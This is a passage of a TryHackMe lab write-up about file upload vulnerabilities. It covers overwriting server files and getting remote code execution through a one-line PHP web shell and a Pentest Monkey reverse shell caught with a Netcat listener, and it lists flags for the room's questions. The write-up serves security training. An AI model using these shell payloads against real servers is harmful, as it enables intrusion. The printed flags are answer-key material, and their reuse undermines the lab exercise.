<h3>Getting started</h3>

Please read and follow the instructions in this task carefully. If you skip over this task and encounter connectivity errors as a result, the Discord volunteers reserve the right to ignore you.

The instructions in this task will help you to configure the hosts file of your device. The hosts file is used for local domain name mapping, bypassing DNS. In short, it allows you to map IP addresses to domain names locally without relying on a DNS server to resolve the IP address for you. This is useful in environments such as TryHackMe where DNS is not available as it allows us to manually map one or more domains / subdomains to an IP address of our choosing. Being able to access content using a domain makes it possible to (amongst many other advantages) use name-based virtual hosting -- commonly shortened to "vhosting" -- to serve multiple websites from a single webserver: a feature which is used extensively in this room.

It is very important that you understand these concepts before continuing. If any of the above information does not make sense, please do some background reading (e.g., here) into how domain names, IP addresses, and webserver VHosts work before continuing with the content of this room.

First up, let's deploy the machine to give it a few minutes to boot.

Once you've clicked deploy, you'll need to configure your own computer to be able to connect.

If you've successfully deployed the machine then the following code blocks will already have the IP address filled in. If any of them have "MACH​INE_IP" in them, then you still need to deploy the machine, and the following instructions will not work.

Using your favourite text editor in an administrative session, open the hosts file on your device.

- On Linux and MacOS the hosts file can be found at ```/etc/hosts```.
- On Windows the hosts file can be found at ```C:\Windows\System32\drivers\etc\hosts```.

On Linux or MacOS you will need to use ```sudo``` to open the file for writing. In Windows you will need to open the file with "Run as Administrator".

Add the following line in at the end of the file:

```
10.10.99.182    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm

```

Note: If you have done this step before then you must remove the previous entry. There should only ever be one line in the file that contains the above URLs. For example, the following example will not work:

```
10.10.10.10    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.99.182    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
```

When you terminate your instance of the upload vulns target machine, make sure to remove this line!

It goes without saying that you will not get the same IP address if you redeploy the target machine later. This means that any existing entries in your hosts file when you redeploy will point at the wrong address (ergo, connectivity error). If you add a duplicate line without removing the original, as mentioned above, you will also get a connectivity error. Removing it as soon as you terminate the machine gives you a clean slate and removes these possibilities for error.

<h3>Introduction</h3>

The ability to upload files to a server has become an integral part of how we interact with web applications. Be it a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on Github; the applications for file upload features are limitless.

Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server. This can lead to anything from relatively minor, nuisance problems; all the way up to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. With unrestricted upload access to a server (and the ability to retrieve data at will), an attacker could deface or otherwise alter existing content -- up to and including injecting malicious webpages, which lead to further vulnerabilities such as XSS or CSRF. By uploading arbitrary files, an attacker could potentially also use the server to host and/or serve illegal content, or to leak sensitive information. Realistically speaking, an attacker with the ability to upload a file of their choice to your server -- with no restrictions -- is very dangerous indeed.

The purpose of this room is to explore some of the vulnerabilities resulting from improper (or inadequate) handling of file uploads. Specifically, we will be looking at:

- Overwriting existing files on a server
- Uploading and Executing Shells on a server
- Bypassing Client-Side filtering
- Bypassing various kinds of Server-Side filtering
- Fooling content type validation checks

Completing the web enumeration (or at least the Gobuster section) and What the Shell rooms would be a good idea before attempting the content in this room.

Let's begin!

<h3>General Methodology</h3>

So, we have a file upload point on a site. How would we go about exploiting it?

As with any kind of hacking, enumeration is key. The more we understand about our environment, the more we're able to do with it. Looking at the source code for the page is good to see if any kind of client-side filtering is being applied. Scanning with a directory bruteforcer such as Gobuster is usually helpful in web attacks, and may reveal where files are being uploaded to; Gobuster is no longer installed by default on Kali, but can be installed with ```sudo apt install gobuster```. Intercepting upload requests with Burpsuite will also come in handy. Browser extensions such as Wappalyser can provide valuable information at a glance about the site you're targetting.

With a basic understanding of how the website might be handling our input, we can then try to poke around and see what we can and can't upload. If the website is employing client-side filtering then we can easily look at the code for the filter and look to bypass it (more on this later!). If the website has server-side filtering in place then we may need to take a guess at what the filter is looking for, upload a file, then try something slightly different based on the error message if the upload fails. Uploading files designed to provoke errors can help with this. Tools like Burpsuite or OWASP Zap can be very helpful at this stage.

We'll go into a lot more detail about bypassing filters in later tasks.

When files are uploaded to the server, a range of checks should be carried out to ensure that the file will not overwrite anything which already exists on the server. Common practice is to assign the file with a new name -- often either random, or with the date and time of upload added to the start or end of the original filename. Alternatively, checks may be applied to see if the filename already exists on the server; if a file with the same name already exists then the server will return an error message asking the user to pick a different file name. File permissions also come into play when protecting existing files from being overwritten. Web pages, for example, should not be writeable to the web user, thus preventing them from being overwritten with a malicious version uploaded by an attacker.

If, however, no such precautions are taken, then we might potentially be able to overwrite existing files on the server. Realistically speaking, the chances are that file permissions on the server will prevent this from being a serious vulnerability. That said, it could still be quite the nuisance, and is worth keeping an eye out for in a pentest or bug hunting environment.
Let's go through an example before you try this for yourself.

In the following image we have a web page with an upload form:

![demo](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/e72d542d-92f0-4d6f-b1c2-4fac2d366204)

You may need to enumerate more than this for a real challenge; however, in this instance, let's just take a look at the source code of the page:

![code demo](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/7273385a-c791-43fa-ae83-032f1ef3642c)

Inside the red box, we see the code that's responsible for displaying the image that we saw on the page. It's being sourced from a file called "spaniel.jpg", inside a directory called "images".

Now we know where the image is being pulled from -- can we overwrite it?

Let's download another image from the internet and call it ```spaniel.jpg```. We'll then upload it to the site and see if we can overwrite the existing image:

![dog demo](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/5df7d203-fbb0-4f26-8c49-1434effe11e7)

![dog 2 demo](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/9c5568a5-cf66-4cf2-b3a6-060373ce248f)

And our attack was successful! We managed to overwrite the original ```images/spaniel.jpg``` with our own copy.

Now, let's put this into practice.

Open your web browser and navigate to ```overwrite.uploadvulns.thm```. Your goal is to overwrite a file on the server with an upload of your own.

**Questions / Answers**

What is the name of the image file which can be overwritten?

![demo2](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/c10af9d1-b137-48a7-a465-aa089e0f91ab)

```mountains.jpg```

Overwrite the image. What is the flag you receive?

![thm](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/f92235c3-8571-4280-9e1f-d79945071cb0)

```THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}```

<h3>Remote Code Execution</h3>

It's all well and good overwriting files that exist on the server. That's a nuisance to the person maintaining the site, and may lead to some vulnerabilities, but let's go further; let's go for RCE!

Remote Code Execution (as the name suggests) would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low-privileged web user account (such as ```www-data``` on Linux servers), it's still an extremely serious vulnerability. Remote code execution via an upload vulnerability in a web application tends to be exploited by uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute). Traditionally this would be PHP, however, in more recent times, other back-end languages have become more common (Python Django and Javascript in the form of Node.js being prime examples). It's worth noting that in a routed application (i.e. an application where the routes are defined programmatically rather than being mapped to the file-system), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.

There are two basic ways to achieve RCE on a webserver when exploiting a file upload vulnerability: webshells, and reverse/bind shells. Realistically a fully featured reverse/bind shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads, or if firewall rules prevent any network-based shells). We'll take a look at each of these in turn. As a general methodology, we would be looking to upload a shell of one kind or another, then activating it, either by navigating directly to the file if the server allows it (non-routed applications with inadequate restrictions), or by otherwise forcing the webapp to run the script for us (necessary in routed applications).

Web shells:

Let's assume that we've found a webpage with an upload form:

![rce](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/0f83eeef-cfdb-4676-96bd-442f42f1bbbc)

Where do we go from here? Well, let's start with a gobuster scan:

![rce2](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/24aab17c-f19c-45cb-824a-c72c43059cf2)

Looks like we've got two directories here -- ```uploads``` and ```assets```. Of these, it seems likely that any files we upload will be placed in the "uploads" directory. We'll try uploading a legitimate image file first. Here I am choosing our cute dog photo from the previous task:

![spaniel](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/0daab21d-e685-43eb-a25d-e1456b241f64)

![rce3](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/9b52506f-8fcc-448b-a2ce-86d12259b634)

Now, if we go to ```http://demo.uploadvulns.thm/uploads``` we should see that the spaniel picture has been uploaded!

![spaniel1](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/ddba524d-e47c-4378-98da-0612008c005a)

![spaniel2](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/448b186a-f32d-4e4b-8b1c-b9f9e9581315)

Ok, we can upload images. Let's try a webshell now.

As it is, we know that this webserver is running with a PHP back-end, so we'll skip straight to creating and uploading the shell. In real life, we may need to do a little more enumeration; however, PHP is a good place to start regardless.

A simple webshell works by taking a parameter and executing it as a system command. In PHP, the syntax for this would be:

```
<?php
    echo system($_GET["cmd"]);
?>
```

This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.

Let's try uploading it to the site, then using it to show our current user and the contents of the current directory:

![phphuynya](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/b65ddee3-4ea5-42c6-a51b-59c8172709c0)

Success!

We could now use this shell to read files from the system, or upgrade from here to a reverse shell. Now that we have RCE, the options are limitless. Note that when using webshells, it's usually easier to view the output by looking at the source code of the page. This drastically improves the formatting of the output.

Reverse Shells:

The process for uploading a reverse shell is almost identical to that of uploading a webshell, so this section will be shorter. We'll be using the ubiquitous Pentest Monkey reverse shell, which comes by default on Kali Linux, but can also be downloaded here. 

You will need to edit line 49 of the shell. It will currently say ```$ip = '127.0.0.1';  // CHANGE THIS```
 -- as it instructs, change ```127.0.0.1``` to your TryHackMe tun0 IP address, which can be found on the access page. You can ignore the following line, which also asks to be changed.With the shell edited, the next thing we need to do is start a Netcat listener to receive the connection. ```nc -lvnp 1234```:

 ![nc](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/0316dfd1-4cb3-47dc-b9c7-d693dbaf734a)

 Now, let's upload the shell, then activate it by navigating to ```http://demo.uploadvulns.thm/uploads/shell.php```. The name of the shell will obviously be whatever you called it (```php-reverse-shell.php``` by default).

The website should hang and not load properly -- however, if we switch back to our terminal, we have a hit!

![shell meow](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/9e3aa5ac-d344-45c0-85f3-0729dac8971e)

Navigate to ```shell.uploadvulns.thm``` and complete the questions for this task.

**Q/A**


Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?

(N.B. This is a good habit to get into, and will serve you well in the upcoming tasks...)

![bull](https://github.com/schoto/THM-Web-Hacking-Fundamentals/assets/69323411/b44a0ea1-9982-4a4f-8224-08d8c23e30ff)

```/resources```

Get either a web shell or a reverse shell on the machine.
What's the flag in the /var/www/ directory of the server?

```THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}```

<h3>Filtering</h3>

